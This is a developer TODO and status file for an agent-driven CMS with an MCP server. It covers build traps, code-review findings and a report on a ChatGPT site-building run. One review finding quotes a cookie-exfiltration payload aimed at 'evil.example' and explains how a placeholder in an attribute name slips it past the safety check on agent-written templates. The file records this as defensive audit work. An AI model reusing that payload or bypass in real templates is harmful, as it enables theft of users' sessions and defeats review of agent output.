# TODOs

The running work list. Deeper lists live in their own files and are linked from here
rather than copied — `security-todo.md` (the auth migration, phase by phase),
`cms-review-todo.md` (~25 verified defects in `admin/`), `site-system.md` (the
composition contract itself), `mcp-server.md` (the tool surface).

**Ordering:** `Now` is what is actually next and why. Everything under `Open` is real
but unscheduled. The shipped log is at the bottom — it is context, not work.

Started 2026-08-15. Last restructured 2026-08-19.

---

## Where things stand, end of 2026-08-19

The demo happened. Everything below is the state a fresh session inherits.

### What is live

- **`lanzacms.com`** is on `main` (`21f06aa`), deployed and verified. Its draft
  (`staging`) is back to matching production: Dave reset it after the demo, so none
  of the violin content survives anywhere.
- **`lanza-site@0.1.13`** is published on npm. Tenants pin an exact version, so
  nothing moves until someone bumps a repo. Dave runs `npm publish`; the machine is
  not logged in for it.
- **`dsottimano/lanza-template`** (the repo every new site is generated from) now
  ships a homepage that tells a new owner how to connect ChatGPT or Claude over MCP,
  gitignores the `frontend/` the build copies in, and pins `0.1.13`.
- **`dsottimano/ai-panama`** is the live third-party test tenant, pinned `0.1.13`,
  with an agent-written ASCII cat on its draft. Its MCP address is
  `https://ai-panama-62d01b9d9611.pages.dev/api/mcp`.

### The trap that cost the most time today, so it does not cost it twice

`0.1.12` **failed every tenant build** and no local check caught it. `lanza build`
copies the package's `functions/` into the tenant repo root, and this morning's MCP
work added `../../frontend/lib/*` imports to `mcp-core.ts`. That path resolves in
this monorepo and does not resolve in a tenant, so esbuild failed, Cloudflare failed
the BUILD, and the site kept serving its previous version silently. `0.1.13` copies
`frontend/lib` alongside.

**So: `npm test`, `lanza build` and even `wrangler pages functions build` run HERE
prove nothing about a tenant.** The only real check is a tenant checkout:

```sh
gh repo clone dsottimano/ai-panama /tmp/t && cd /tmp/t
npm install && npm run build
npx wrangler@3.114.17 pages functions build --outdir /tmp/tfn   # must compile
```

And verify a deploy by the commit's check-run, never by the site responding, because
a failed build leaves the previous version serving:

```sh
gh api repos/<owner>/<repo>/commits/main/check-runs \
  --jq '.check_runs[] | select(.name=="Cloudflare Pages") | .conclusion'
```

### Two live lessons about drift

1. **Publishing conflicts when both branches touch one file.** `ai-panama` hit this:
   its draft was cut at repo creation, `main` moved (new homepage, pin bumps), and
   the agent's homepage edit could not merge. The conflict was a good thing, because
   a blind merge would have reverted `package.json` to `0.1.10` and broken the build
   again. A version bump alone touches only `package.json` and merges cleanly, so an
   ordinary tenant does not hit this.
2. **A draft never catches up on its own.** Still the open §0 item. The Discard
   button is the manual fix and is deployed; the automatic catch-up is not built.

### House style, as of today

**No em dashes in anything a reader sees.** The whole site was swept: page content,
SEO strings, marketing pages in both locales, legal, `llms.txt`, `site-system.json`
and the CSS comments that travel inside a template. Source comments in `.astro` and
`.ts` files keep theirs. `lanza-site` still ships `window.lanza — call lanza.help()`
in `Seo.astro` on published tenants; that clears when `0.1.14` goes out.

---

## What this product is, in one paragraph

Someone onboards — broker, Cloudflare, GitHub — then opens ChatGPT or Claude or Grok,
connects this site's MCP server, and **talks**. The LLM works out what content types the
site needs, invents them, creates the URLs, writes the page templates and their input
fields, sets the look, shows the owner a staging URL, and the owner says yes. Read that
again before planning anything: it is the test every capability is judged against, and
the failure mode is building a library of prefabricated site types instead. Dave,
2026-08-19: *"I'm using recipes and real estate as examples, not prefabricated."*

`docs/site-system.md` is the grammar the LLM composes against; `npm run check:site` and
the MCP `validate_site` tool are what tell it whether what it invented holds together.

---

## Cold-start (a fresh session picks up HERE)

Both items this section used to carry are done: the Discard button shipped
(`63143de`) and the code review paid for itself (results below, five fixes shipped).
Next work is the open review findings, then `Now`.

Every change must keep the baseline green (commands below) AND the Pages Functions
build compiling. That last one is not optional, it is what CI does and `npm test`
does not prove it. If the change touches anything under `functions/` or `bin/`, the
tenant checkout above is a THIRD check that neither of the other two makes.

## Starting cold? Read these, in this order

1. `CLAUDE.md` — project rules. Rule 7 is the site system, rule 6 the review surface,
   rule 4 the CMS + security posture.
2. `docs/site-system.md` — the composition contract. **The code wins over the doc**;
   `functions/_lib/site-system.mjs` is the enforcement.
3. `docs/mcp-server.md` — the 20 tools, and which ones exist to close the gap above.
4. This file's `Now` section (below). Three items, in priority order.

Then prove the tree is healthy before changing anything:

```sh
npm test            # 291 function + 313 admin, all green
npm run check:site  # 1 template dir, 0 errors, 0 warnings
node bin/lanza.mjs build   # 15 pages + /llms.txt + /site-system.json
npx wrangler@3.114.17 pages functions build --outdir /tmp/fnbuild   # must compile
```

Traps that have already cost time:

- **`astro check` reports 1 pre-existing error** at `Base.astro:36` (`appearance.json`'s
  `brand.scheme` widens to `string`). It is not yours. Don't chase it.
- **The CMS commits to GitHub, not to your checkout.** `git fetch` before assuming your
  `main` is current — live edits to `content/` land upstream while you work.
- **Anything under `functions/` is bundled by Cloudflare with an older esbuild**, so
  `npm test` passing proves nothing about the deploy. That now includes the site-system
  checker and parse5. Check it the way CI will (command above).
- **Never add a content type to this repo's `data/schema.json` to try something out** —
  it is lanzacms.com's own model. Drive the MCP tools in a test instead
  (`functions/_lib/mcp-core.test.mjs` has a fake GitHub), or use
  `scripts/apply-recipe.mjs --into <tmpdir>`.
- **Don't build a recipe library.** See the paragraph at the top. `recipes/event-site` is
  a worked example that proves the machinery runs; it is not the product.

---

## Code review, 2026-08-19 (pre-demo pass)

Scope: the nine feature commits of 2026-08-19 (`6c9f3bc..`), reviewed in two passes
plus a read of the deployed page. **Shipped fixes:**

- `5193de7` — a routed collection rendered as a bare `<main>` with no `Base.astro`
  wrapper. The full story is in the DEMO block above; it is the most valuable thing
  this review found and no test could have found it. Every test passed, `check:site`
  reported 0 errors, the build reported success, and the page was broken.
- `e5b60eb` — a listing's `<title>` was its URL segment ("services"), because a
  listing owns no entry and agents hardcode the heading in the template rather than
  declaring slots. Now falls back to the content type's label.
- `bee080c` — two in the agent-template safety classifier: parse5 hangs a
  `<template>`'s children off `content`, not `childNodes`, so
  `<template><script>…</script></template>` passed `write_template` (inert, so not a
  live hole); and a *relative* URL was refused as `template-executes-js`, telling an
  agent that `<a href="about">` "runs JavaScript on this origin". Split into
  `template-relative-url` — reported, not refused.
- `ad3228c` — `main` tracked generated routes for a `services` collection its own
  schema never declared, so every local build produced a spurious diff.
- `5bdb832` — **`update_content` deleted the rest of the page.** A shallow spread
  treated `slots` as one value, but `slots` IS the page (~50 keys on
  content/pages/en/index.md): an agent asked to change the hero headline sends
  `{slots: {headline: "…"}}` and every other slot vanished, with a green build. Nested
  mappings now merge key by key; `null` removes a key. Same commit: `write_template`
  refused the name `parts` (it lands in templates/parts/, where `checkSite` filters it
  out so `validate_site` never reports the junk).

**Open, in severity order.** None of these blocks the demo; the first two are the
same class as the bug above — the checker says clean and the page is wrong.

- [ ] **`checkSite` never reads `content/**`,** the top layer of its own stack. An
      entry missing a required frontmatter field fails the ENTIRE Astro build
      (`InvalidContentEntryDataError`, nothing deploys) with `check:site` clean.
      "From From C$95" is the same family: nothing compares a template's static text
      to the values entries actually carry.
- [ ] **`checkTemplate` checks a `detail` template against the wrong layer.** It
      layers `DETAIL_RESERVED` onto the template's own `fields.json`, but the runtime
      scope is the ENTRY'S FRONTMATTER (`detailScope`). Renaming a collection field in
      `data/schema.json` leaves the detail template reported clean while its whole
      block silently empties — and `position: "detail"` is the one the doc calls
      easiest to get wrong.
- [ ] **`checkSite` never validates `route.base`,** though the same file exports the
      rules (`ROUTE_SEGMENT`, `RESERVED_ROUTE_BASES`) that `gen-routes.mjs` and
      `mcp-core.ts` consume. `base: "es"` passes the checker, then `gen-routes.mjs`
      `die()`s and the whole build fails — Cloudflare keeps serving the old version.
      `gen-routes.mjs` also carries a THIRD rule (locale-prefix collision) that exists
      in neither the checker nor `mcp-core`, so `create_content_type` would accept it.
- [ ] **A listing with `listing.item` but no `listing.of` is checked not at all** —
      `listing-unknown-collection` only fires when `of` is truthy and
      `listing-unknown-field` only when the collection resolves. Nothing asserts that
      `listing.of` is the collection whose `route.list.template` names this template,
      so a listing can validate against a different collection than it renders.
- [ ] **`gen-routes.mjs` detail routes disagree with `entryUrl` for a non-localized
      collection whose files sit under a locale folder** — `params: { slug: entry.id }`
      builds `/events/en/x/` while every listing link points at `/events/x/`. NOT
      reachable over MCP (`create_content` writes non-localized entries flat), so it
      needs someone to flip `localized: true → false` on a type that already has
      content, or to place files by hand.
- [ ] `RESERVED_ROUTE_BASES` omits `style-preview`, which is a real route
      (`frontend/pages/style-preview/[...variant].astro`). The list is hand-maintained
      rather than derived from `frontend/pages/` — that is the actual defect.
- [ ] **A placeholder spliced into an attribute NAME defeats the safety check.**
      `checkTemplateSafety` substitutes `{{ x }}` → `/lanzasafeplaceholder` before
      parsing, which RETOKENIZES the markup, so
      `<div on{{ evt }}click="fetch('https://evil.example/?c='+document.cookie)">`
      returns nothing from `checkTemplate` and `write_template` commits it. Not XSS —
      every render path goes through `renderChecked`, which throws — but that is the
      damage: the template is accepted, publish runs, `astro build` dies, and per
      CLAUDE.md the site silently keeps serving the previous version.
- [ ] **`write_template` writes template.html and fields.json as two commits with no
      rollback.** If the second fails (rate limit, 409, transient 5xx), staging holds a
      template with no fields.json — `validate_site` calls it an error, the CMS shows
      no inputs — and the error the agent gets doesn't say the first half landed.
- [ ] **`update_content_type` throws AFTER its write succeeded** — the `updated.fields`
      map runs after `saveText`, and nothing enforces that a folder collection has
      `fields` (`checkSite` uses `c.fields || []`). The agent sees a failure for a call
      that worked, and retries. Needs a hand-authored or imported schema.
- [ ] **`data/schema.json` read-modify-write has no optimistic concurrency.**
      `saveText` re-resolves the sha at WRITE time, so a change landing between the
      read and the write — the CMS content-type editor, another MCP call, a
      `Promise.all` batch in `functions/api/mcp.ts` — is overwritten instead of 409'd.
      `save()` is last-write-wins by design for entries; here it loses a collection.
- [ ] **`readSiteFile` caches a REJECTED promise.** `getCollections` guards exactly
      this (`pending.catch(() => collectionsCache.delete(client))`, "a transient GitHub
      error would poison the request"); `readSiteFile` doesn't, so one transient 5xx on
      data/site.json fails every later `resolveLocale` in that request — and
      `resolveLocale` is on every write path.
- [ ] `set_seo` 400s on an idempotent re-set: the no-op detector compares the merged
      object to the current one, so setting a field to the value it already has reads
      to an agent as a retryable failure.
- [ ] A new content type's `draft` field, where one is declared with `default: true`,
      means an entry written without the key is hidden from the production build.
      `create_content` writes `draft: false` explicitly and `create_content_type`
      declares no draft field at all, so the MCP path is safe — this bites a
      hand-authored `fields.json`.

**Checked and clean** (so nobody re-reviews it): `assertEntryPath` / `assertSafePath`
confinement, `isContentFolder` dropping a hostile `folder`, the derived-not-accepted
`folder` in `create_content_type`, `SETTINGS_FILES` path derivation, `resolveLocale`
guarding the locale interpolation, owner-only auth and the broker denied-vs-unavailable
split in `functions/api/mcp.ts`, the subrequest budget (worst realistic call ~32 of 50),
and menu round-tripping. parse5 bundles into the Worker at 567 KB raw / 126 KB gzipped
with no import attributes.

---

# Now

Three items. The tool surface is complete enough that an LLM can build a site end to end
(there is a test that does it), so these are the three things standing between "the tests
pass" and "someone actually did this".

## 0. `staging` drifts behind `main` forever — FOUND LIVE, BLOCKS THE REVIEW SURFACE

Found 2026-08-19 on the first real-LLM run. `staging` on this repo is **51 commits
behind `main`**, branched at `b841cd9` (2026-08-16, a CMS publish). None of those 51
commits touched `content/` or `data/` — they are all hand/agent development.

The mechanism, and it is in BOTH implementations:

- `publish` merges **staging → main**. One direction, and only on publish.
- **Nothing ever merges main → staging.** `ensureWorkingBranch()` returns the moment
  the branch exists — `functions/_lib/lanza-content.ts` and
  `admin/src/backend/github.ts:370` are the same three lines.
- So staging freezes at the last publish and falls behind by exactly the amount of
  non-CMS development.

**Why it matters more than it looks.** The staging preview is the review surface — "a
change is a proposal you can look at before it goes live" (Rule 6). Staging builds new
CONTENT against OLD CODE. On the run that found this, an agent correctly created a
content type with a `route`, and `/services/` 404'd on staging because
`gen-routes.mjs` does not exist on that branch. Everything the agent did was right and
none of it was visible. Merging `main` into a local branch built all 26 pages first try.

**Severity, corrected.** This is mostly specific to THIS repo, and the reason is worth
stating plainly because it is easy to over-generalise (I did, on the day):

- A **customer's** repo holds only their content. The program that renders it comes
  from the `lanza-site` npm package, i.e. from `node_modules`, not from their branches.
  So their `main` and `staging` always run the SAME program, and staging being "behind"
  only means "missing some published text" — which is meaningless, since staging is
  where the edits are being made. Staging works exactly as anyone would assume.
- **This repo is the odd one out**: it is where Lanza itself is built, so it holds the
  content AND the source code in the same place. Staging here is content plus a frozen
  snapshot of the program from whenever the last publish was.

The narrow case that DOES affect a customer: right after their pinned `lanza-site`
version is bumped on `main`, their staging still has the old `package.json` and
previews with the old program until the next publish. Real, worth fixing, nothing like
what happened here.

- [ ] **"Discard all pending changes" in the CMS — HALF DONE, finish this first.**
      Today the only other way to throw a draft away is
      `git push origin main:staging --force` from a terminal, so an owner cannot undo an
      agent's whole session without a developer — the person this product exists to
      remove. Publish is a button; its opposite must be too.

      **Done and committed:** `GitHubClient.discardDraft()` in
      `admin/src/backend/github.ts` — reads production's head and force-updates the
      working branch to it. Tested green, type-checks, no caller yet. The doc comment on
      it carries the reasoning; read that before changing it.

      **Still to do — the UI, in `admin/src/ui/PendingView.vue`:**
      - A "Discard everything" control in the header, beside "Publish everything". Those
        two are the ends of one decision and belong together. `changes` is already
        loaded on that screen, so the file list needs no new request.
      - The confirm must **name what will be lost** — the rows already rendered — not
        ask "are you sure?". `window.confirm` with a listed summary matches the existing
        pattern (`ContentTypesView.vue:142`, `SiteHealthView.vue:80`); a bare confirm
        does not meet the bar for something irreversible.
      - Afterwards, re-run `load()` so the screen lands on its own "Nothing waiting"
        state rather than showing rows that no longer exist.
      - Hide it when `nothingWaiting` — there is nothing to discard.
      - Errors go through `reportError` like the rest of the screen.

      **Why it is safe to build:** `functions/_lib/gh-proxy.ts` already allows
      `PATCH git/refs/heads/<branch>` on both branches, so no proxy or security change
      is involved. It IS a destructive GitHub write, and a deliberate exception to
      `docs/review-surface.md`'s rule that a revert writes to the editor and never to
      GitHub — that rule stops an automatic undo being irreversible; this is the
      opposite, a human choosing to discard.

      **Second use, same button:** when the working branch is BEHIND production and has
      nothing pending, `discardDraft()` is also the catch-up fix. Reset-to-live and
      catch-up-to-live are one operation.
- [ ] Fast-forward `staging` to `main` whenever it is behind and has nothing pending.
      The gh-proxy already allows the PATCH (`git/refs/heads/<branch>`) — the CMS uses
      it to fast-forward after a commit, so the capability is there and unused for this.
- [ ] Decide what happens when staging is behind AND has pending edits: a merge can
      conflict, and a conflict during "open the CMS" is the worst possible moment.
      Probably merge main→staging and surface the conflict the way `publish` already
      does, rather than silently leaving it stale.
- [ ] Whatever the fix, `stagedNote()` in `mcp-core.ts` currently promises "a
      Cloudflare build takes about 4-6 minutes, so the page will still show the old
      content until then. That delay is normal and is not a failed write." That text
      exists to PREVENT false bug hunts and on this run it caused one — the agent
      repeated it faithfully about a URL that could never work. It must not claim the
      page will appear unless staging can actually render it.

## 1. Drive it with a REAL LLM against a REAL site — CRITICAL

**Everything shipped so far is proven by tests that call the tool functions directly.**
That proves the mechanics. It does not prove the *ergonomics*, and the ergonomics are the
product: a tool description is the only contract a cold model gets, and there is no
evidence yet that a model reads `describe_site_system` and then does the right thing.

This is the highest-value unknown on the list, and it is the one most likely to be wrong.

**First run done, 2026-08-19 — ChatGPT against `lanzacms.com` (signed in as the owner,
so no 403). Brief: "I run a violin repair shop in Toronto. I want a page for each
service I offer — with the price and how long it takes — and a page listing them all."**

It worked. 16 commits on `staging`, unprompted, in the order the system requires:
`write_template` (detail) → `create_content_type` → `write_template` (index) →
**`update_content_type`** to attach the listing → 9 entries → `set_menu`. It found the
forced ordering on its own, including the deferred-listing workaround. `check:site`
came back clean on its output — 3 template dirs, 0 errors, 0 warnings — and the build
produced 26 pages. It namespaced every CSS class, which is a documented trap it could
only have got from the contract.

What went wrong, none of it the agent's fault:

- [x] `staging` is 51 commits behind `main`, so none of it rendered. See §0 above.
- [ ] **"From From C$95"** — the detail template hardcodes a `From ` prefix and the
      seeded content also starts with "From". The agent wrote both halves and never saw
      the result. Nothing catches this: it is not a contract violation, it is a thing
      only a rendered page shows. The lesson is that `validate_site` proves coherence,
      not that the page reads correctly — and an agent with no way to SEE its output
      will keep making this class of mistake. Worth asking whether a tool should return
      rendered text for one entry.
- [ ] It never mentioned a home page, so item 3 below is still untested.
- [ ] Re-run against a **datadefine-owned** site once §0 is fixed, to exercise the
      third-party path rather than the owner path.
- [ ] Give it a one-line brief in a shape nobody has tried ("a site for my violin repair
      shop") and watch where it goes wrong. Expect the failures to be in the DESCRIPTIONS,
      not the logic: a tool it never calls, a field it invents, an order it gets wrong.
- [ ] **Write down every wrong turn before fixing any of them.** The instinct will be to
      patch the first one; the pattern across all of them is the finding.
- [ ] Known-weak spots to watch specifically:
      - Does it call `describe_site_system` at all, or guess?
      - Does it work out the template → content-type order without being told? (The order
        is forced: a type's fields come FROM its detail template, and its route NAMES its
        listing template. `write_template` defers `listing-unknown-collection` for exactly
        this reason.)
      - Does it ever call `validate_site` unprompted?
      - Does it know a page needs `preset` + `slots`? See item 3.

## 2. Media — an agent cannot put a picture on the site

A violin shop, a pottery studio and a restaurant all need photographs, and there is **no
upload tool**. An LLM can reference a URL it was given and nothing else. The CMS uploads
to `public/images/uploads` and serves them as static assets.

- [ ] **`upload_media`** — write a binary to `public/images/uploads/<name>` on staging and
      return the path. GitHub's Contents API takes base64, so the transport is the easy
      half.
- [ ] The hard half is **where the bytes come from**. An MCP client cannot hand over a
      local file, so the realistic inputs are a URL to fetch (server-side fetch from a
      Worker — needs a size cap, a content-type allowlist and a think about SSRF) or
      base64 in the tool call (bounded by the client's own message limits).
- [ ] Whatever it accepts, the path is **derived**, never passed: `public/images/uploads/`
      plus a slugged filename plus an extension from a fixed allowlist. Same posture as
      the settings paths — see `security-model.md` §3.
- [ ] Changing the media path breaks every existing image reference. Don't make it
      configurable.

## 3. The home page — composable, but undocumented

An LLM can create a page entry whose `preset` names a template folder and whose `slots`
carry the values, and it works. Nothing tells it that. `describe_site_system` explains
positions and widgets but never says how a *page* reaches a template.

- [ ] Say it in `describe_site_system`: a page is an entry in `pages` with
      `preset: "<template folder>"` and `slots: { … }`, and `template` is a different
      thing (the layout variant — `default` / `full-width` / `landing`). The two names are
      near-synonyms and an agent reliably guesses wrong; this is already in
      `site-system.md`'s Traps and needs to be in the served contract.
- [ ] Consider a worked example in the contract — the smallest page template plus the
      `create_content` call that fills it. An example is worth more than a rule here.
- [ ] Check whether `create_content` needs to say it too. Its description covers
      frontmatter generically and never mentions `preset`.

---

# Then — auth and the release

1. **Phase 4 of the zero-secret auth migration.** `security-todo.md` §0 is written to
   start cold. The first step is not a code change: **sign in on the live site and
   confirm the CMS works end to end**, because phase 4 deletes the fallback and should
   not be done while unable to use its replacement.
2. **Publish `0.1.12`** — read "Before publishing" below first. Tenants are on `0.1.11`
   and have none of this work.
3. ~~Merge `site-system`.~~ Merged to `main` at `eeb504b`. Everything since is on `main`
   and unpushed — `git log origin/main..main` is the honest list.

---

# Open — the site system

`docs/site-system.md` is the contract; `npm run check:site` and MCP `validate_site` both
enforce it, from the same module.

- [ ] **Nothing can DELETE.** No tool removes a content type, a template or an entry-less
      collection, and `update_content_type` will not rename `name` (that is a migration —
      the folder and every built URL derive from it). An LLM that gets the model wrong
      twice leaves debris. Deletion is destructive and revert-shaped, so design it against
      `docs/review-surface.md` before building it.
- [ ] **A site cannot become multilingual over MCP.** `data/site.json` (locales, default
      locale) is not in the Settings collection and no tool touches it. Adding a locale
      restructures routing and hreflang for the whole site, so it is a real feature.
- [ ] **Taxonomy routes for custom types** (`/properties/neighbourhood/<x>/`) are not
      generated — only the listing and the detail page are.
- [ ] **The CMS does not expose `route`.** The content-type editor needs a route panel;
      right now a route is only reachable as data or through MCP.
- [ ] **Filtering, sorting and pagination.** A listing takes one `sortBy`. Forty entries
      is fine; four hundred is not, and "3+ bedrooms under X" is not expressible at all.
      This is the first thing a real catalogue will hit.
- [ ] **Relations between types render nowhere.** The `relation` widget exists in the model
      and a detail template cannot print the related entry's fields.
- [ ] **Galleries have no template idiom.** A `list` of images works, but nothing shows the
      shape an agent should reach for.
- [ ] `recipes/` is not in `package.json` `files`, so tenants receive none. Deliberate, and
      per the framing at the top of this file, likely to stay that way.
- [ ] Pre-existing, unrelated: `astro check` reports one error at `Base.astro:36`
      (`appearance.json`'s `brand.scheme` widens to `string` through the JSON import).

# Open — the review surface

- [ ] **Clicking a preview region does not focus the field.** Selection highlights and
      lists it, but the cursor does not move. This is the step toward editing IN the
      preview and needs a focus-by-path API the form does not have — the path plumbing
      now exists (`field-paths.ts`, `data-field-path` stamps), so the missing piece is
      scroll-and-focus by path, not the addressing.
- [ ] **Click-to-edit in the preview**, the actual goal. Blocked on the preview's 180ms
      `innerHTML` swap, which destroys DOM identity on every keystroke: an inline editable
      region needs re-render suppression while it holds focus.
- [ ] **`{{{ body }}}` has no sub-region markers.** The body is one marker, whole.
      Per-paragraph mapping needs the editor's own node positions, not the template
      engine. Fine until someone wants to click a paragraph in the preview.
- [ ] A slot placed directly in `<table>`/`<tr>` content gets foster-parented by the
      browser along with its marker. The raw text already is, marker or not.
- [ ] **`PendingView` has no count badge in the nav.** `pendingCount` (`ui/staging.ts`)
      only refreshes on editor mount/save, so it would read stale on a fresh load. Wire a
      refresh, then add the badge.
- [ ] Per-row publish does not exist and must not be faked: publishing is a staging→main
      merge, all or nothing. If per-row is wanted it is a real feature (cherry-pick or
      per-path merge), not a UI change.

# Open — settings, and "every possible option"

The inventory is done. Three tiers, in order:

- [ ] **Declare more field-driven screens.** `Field[]` → `FieldForm` already renders any
      declared field set, and exactly one screen uses it (SEO defaults). Anything
      form-shaped costs a JSON entry and no Vue.
- [ ] **Collapse the duplicated catalogs into data** — what actually makes the CMS
      configurable, and the DRY fix regardless:
      - `FONT_CATALOG` is **triplicated** (`admin/src/backend/brand.ts`,
        `frontend/lib/appearance.ts`, `frontend/styles/site.css`), each with a
        "⚠️ MIRROR" comment.
      - The locale catalog is duplicated: `LANG_CATALOG` (`admin/src/backend/site.ts`) vs
        `KNOWN_LOCALE_CODES` (`frontend/lib/i18n.ts`). The second must keep recognising
        DISABLED locales, so it cannot derive from `site.json` — derive both from one
        catalog instead.
      - `COLOR_TOKENS`, `RADIUS_OPTIONS`, `PRESETS` (`brand.ts`) are fixed enums; a
        seventh colour token needs a code change.
      - Newly relevant: `site-system.mjs` mirrors `admin/src/schema.ts`'s `Widget` union
        and `Base.astro`'s `partData`, and `COLLECTION_NAME` mirrors
        `gen-content-config.mjs`. Three more MIRROR comments, same disease. (The route
        rules went the other way and are now shared — `gen-routes.mjs` imports them.
        That is the pattern to copy.)
      - `set_brand` made this worse in a useful way: `FONT_CATALOG` is now the list an
        MCP client is TOLD is valid, so a fourth copy drifting is now visible to a
        stranger's agent, not just to us.
- [ ] **Dead config**: `data/appearance.json`'s `theme` and `logo` are unreachable from
      the UI — `schema.json` still declares them but the sidebar filters that entry out.
      `set_brand` now writes `logo`, so it is half-alive: reachable by an agent and not by
      a person. Wire it or drop it, but stop leaving it in between.
- [ ] **Do NOT expose**: the gh-proxy allowlist, `adminLogin`/`owner` (self-promotion),
      branch names (they live in two files with no shared source), media paths (changing
      them breaks every existing image reference).

# Open — the dashboard direction

- [ ] **Global to-do beyond publishing.** `PendingView` answers "what is waiting to go
      out". The dashboard also wants "what needs a decision" — broken links, missing
      translations, a page no one has touched in a year. `npm run check:site` findings
      belong here too.
- [ ] **Connectors, read-only first** (Search Console). Anything that SPENDS money (Meta
      ads) reintroduces the standing-secret blast radius the auth migration just removed,
      and needs a spend gate that a typo fix does not.
- [ ] **Agent attribution.** Every change is already a commit with an author, and nothing
      in the UI shows who made it. "The agent changed this" vs "you changed this" is the
      difference between reviewing and re-reading.

# Open — smaller, and unrelated

- [ ] `cms-review-todo.md` — ~25 verified defects in `admin/`, none fixed.
- [ ] Rotate the credentials `keys-and-secrets.md` §7 lists as owed.
- [ ] Point the bot's `GITHUB_TOKEN` at `staging`, not `main`.
- [ ] `vue-tsc` segfaulted once (clean on re-run, exit 0). If it recurs, it is the
      toolchain, not the types.

---

# Before publishing `0.1.12`

`functions/` ships inside the `lanza-site` package and `bin/lanza.mjs` copies it into the
tenant repo at build time, so **a release replaces every tenant's auth gate and both
proxies at once**.

- [ ] **Finish phase 4.** Mid-migration, `editors` in `lanza.config.json` controls nothing
      (roles come from GitHub collaborators) while `PeopleView` still edits that list — a
      tenant owner would "invite" someone and nothing would happen, silently. Phase 4
      replaces that panel with a link to GitHub's collaborator settings.
- [ ] **Verify against a datadefine-owned tenant** (`dmg` / `mcp-test`), never a customer.
      A `ghu_` token is bounded by *App installation ∩ the user's own permission*, and the
      work is only proven on `dsottimano/lanza`, where the App is installed. If a tenant
      repo lacks the installation, device-flow tokens may not see it and everyone there is
      locked out of their own CMS.
- [ ] Every tenant editor is signed out at once by the release and needs one device code.
      That should land with working invite UI, not before it.
- [ ] New: the release also ships `gen-routes.mjs` and the two collection-route
      components. Additive — a tenant with no `route` block generates nothing and builds
      byte-identically (verified) — but that is the claim to re-check on the first tenant
      build after release.
- [ ] New: `functions/` now carries the site-system checker **and parse5**, so the Worker
      bundle went 221K → 524K. Well inside Cloudflare's limits, but it is the first time a
      dependency entered that bundle; re-verify with the `wrangler pages functions build`
      command in the cold-start block before releasing.
- [ ] New: the MCP surface went from 10 tools to 20, and six of them WRITE outside
      `content/` (templates, parts, `data/schema.json`, the settings files). Every one is
      confined by a derived path rather than a validated one; `security-model.md` §3 is
      the record. Re-read it before a release that widens the surface again.

---

# Shipped

## 2026-08-19 — the site system, reachable without a checkout

Nine commits on `main`, unpushed. The site system existed but was operable only by
someone with a terminal — which is precisely the person who did not need a CMS. This
closed that.

- **The checker moved to `functions/_lib/site-system.mjs`** so the MCP server runs the
  same code `npm run check:site` does. `checkSite()` takes injected IO — the CLI hands it
  `fs`, the server hands it a GitHub branch — because a second implementation would be a
  second opinion.
- **The contract became data.** `CHECKS` (every problem code with the silent failure it
  stands for) and `siteSystemContract()`, served at **`/site-system.json`** and by
  `describe_site_system`, from the same constants the checker enforces. A test scans the
  source both ways so the published list cannot rot.
- **`/llms.txt` says what the site IS** — the one rule, the contract URL, the MCP
  endpoint, and a "Content types" section generated from the tenant's own `schema.json`.
- **Ten new MCP tools**, taking the surface from 10 to 20: `describe_site_system`,
  `validate_site`, `write_template`, `write_part`, `create_content_type`,
  `update_content_type`, `get_settings`, `set_brand`, `set_menu`, `set_seo`.
  Settings was not a gap but a blind spot — `getCollections()` drops every folderless
  collection, so no `kind: "files"` entry was reachable at all.
- **Template safety, classified.** A template is raw markup emitted with `set:html` on the
  origin that serves `/admin`, and `assert-rendered-safe.ts` was built on its author being
  a trusted human. `checkTemplateSafety()` PARSES (reusing `dangerousConstructs()`, never
  a regex) and severity depends on the AUTHOR: warnings for a human, refusal for an agent.
  `security-model.md` §3 carries the reasoning, §5 the two accepted limits.
- **Two end-to-end tests** in `mcp-core.test.mjs` — a real-estate site and a pottery
  studio, both invented from nothing through the tools, the second including the owner
  changing their mind and publishing. If they stop passing, the pitch is not true.

Three bugs the tests caught before shipping, all of the same kind — something failing
silently: a false positive on `href="{{ url }}"` (not a URL yet), `write_template`
mutating the caller's object, and a `note` key collision that swallowed the "this type
has no URL" warning.

**Deprioritized here:** `apply_recipe` and per-vertical recipes. See the framing at the
top of this file.

## 2026-08-18 — the site system (merged to `main` at `eeb504b`)

The composition contract for agent-built sites. `docs/site-system.md` is authoritative.

- **A cross-layer checker** (`functions/_lib/site-system.mjs`, `npm run check:site`) that mirrors
  the engine's grammar and innermost-out scope resolution rather than approximating them.
  Catches what was silent: undeclared slots, `{{#each}}` over a scalar, unclosed blocks,
  `{{{ }}}` on a non-body slot, dead fields, routes to missing templates.
- **Generic collection routing** — `collection.route` in `data/schema.json` →
  `scripts/gen-routes.mjs` emits the `.astro`. Closes the long-standing gap where a
  CMS-invented content type rendered at no URL and tenants could not ship `.astro` to fix
  it. The trick: hand the engine an entry's frontmatter instead of a page's slots.
- **Recipes** — one directory expands into content type + templates + fields + route +
  seed + styles. Fields declared once (`fieldsFrom`); nothing written unless everything
  validates.
- **`/style-preview/`** — variants from `data/styles.json` side by side, route present
  only when that file is.
- Fixed two errors in `docs/authoring-templates.md` that were teaching agents to write
  broken templates (`showNav` does not exist — it is `showSwitcher`; the "no triple-brace"
  line contradicted both the engine and the table above it).

## 2026-08-15 — auth phases 1–3, and the review surface

**Auth** — device-flow sign-in screen, the gate reading GitHub `permissions`, the proxy
attaching the signed-in person's own token. No broker mint, no standing PAT, zero secrets
on the tenant.

**The review surface** — a change is a proposal with a diff, a rendered before/after and a
one-click revert: `entry-diff.ts`, preview markers in the render engine, `ChangeList.vue`,
`useEntryReview.ts`, `PendingView.vue`.

**Editor fixes** — labelled title, resolved URL with locale prefix, per-entry and per-list
language bars, grouped/collapsed template slots, a sticky preview, focus-follow.
